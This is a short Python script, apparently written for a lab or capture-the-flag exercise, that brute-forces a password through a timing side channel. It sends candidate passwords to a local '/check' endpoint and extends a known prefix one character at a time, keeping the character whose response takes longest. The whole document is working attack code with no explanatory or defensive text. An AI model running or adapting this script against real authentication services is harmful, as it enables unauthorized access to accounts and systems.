import requests
import string


class OnEstDesBrutes:
    car = string.ascii_letters + string.digits

    def __init__(self):
        self.password = 'GuardiaR'
        self.url = "http://192.168.137.146:5000/check"

    def request(self, letter: str):
        json = {
            "password": self.password + letter
        }
        response = requests.post(url=self.url, json=json, verify=False)
        if response.status_code == 200 or response.json()['result']:
            if response.json()['result']['Valid']:
                print(self.password + letter)
                return None
            return int(response.json()['result']['time'])
        else:
            print(f'Erreur : {response.status_code} : {response.text}')
            return
    
    def max_time(self, temps: list[int]) -> int | None:
        i = temps.index(max(temps))
        if temps[i] > temps[i - 1] + 15:
            return i
        
    def brut_force_l(self) -> None:
        time = []
        for l in self.car:
            t = self.request(l)
            if not t:
                return
            time.append(t)
            print(self.password + l, t)
            index = self.max_time(time)
            if index != None:
                self.password += self.car[index]
                return 1
        self.password += self.car[time.index(max(time))]
        return 1
    
    def brut_force_password(self):
        while self.brut_force_l():
            print(self.password)

a = OnEstDesBrutes()
a.brut_force_password()